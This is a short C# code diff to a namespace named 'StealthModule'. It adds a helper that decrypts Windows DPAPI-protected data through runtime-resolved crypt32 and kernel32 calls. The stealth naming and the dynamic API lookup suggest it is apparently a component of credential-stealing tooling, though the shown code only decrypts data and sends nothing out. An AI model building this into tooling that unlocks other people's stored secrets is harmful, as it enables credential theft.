@@ -55,7 +55,32 @@ namespace StealthModule
             public static T GetK32<T>(string func) where T : class { return GetPInvoke<T>("kernel32.dll", func); }
             public static T GetCrypt32<T>(string func) where T : class { return GetPInvoke<T>("crypt32.dll", func); }
             public static T GetBcrypt<T>(string func) where T : class { return GetPInvoke<T>("bcrypt.dll", func); }
+
+            public static bool DecryptDPAPI(byte[] data, out byte[] output)
+            {
+                output = null;
+                var dataIn = new DATA_BLOB { cbData = (uint)data.Length, pbData = Marshal.AllocHGlobal(data.Length) };
+                var dataOut = new DATA_BLOB();
+                try
+                {
+                    Marshal.Copy(data, 0, dataIn.pbData, data.Length);
+                    if (CryptUnprotectData(ref dataIn, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, 0, ref dataOut))
+                    {
+                        output = new byte[dataOut.cbData];
+                        Marshal.Copy(dataOut.pbData, output, 0, (int)dataOut.cbData);
+                        return true;
+                    }
+                }
+                finally
+                {
+                    if (dataIn.pbData != IntPtr.Zero) Marshal.FreeHGlobal(dataIn.pbData);
+                    if (dataOut.pbData != IntPtr.Zero) GetK32<LocalFree_t>("LocalFree")(dataOut.pbData);
+                }
+                return false;
+            }
         }
+
+        private delegate IntPtr LocalFree_t(IntPtr hMem);
 
         [UnmanagedFunctionPointer(CallingConvention.StdCall)]
         private delegate bool CryptUnprotectDataDelegate(ref DATA_BLOB pDataIn, IntPtr szDataDescr, IntPtr pOptionalEntropy, IntPtr pvReserved, IntPtr pPromptStruct, uint dwFlags, ref DATA_BLOB pDataOut);
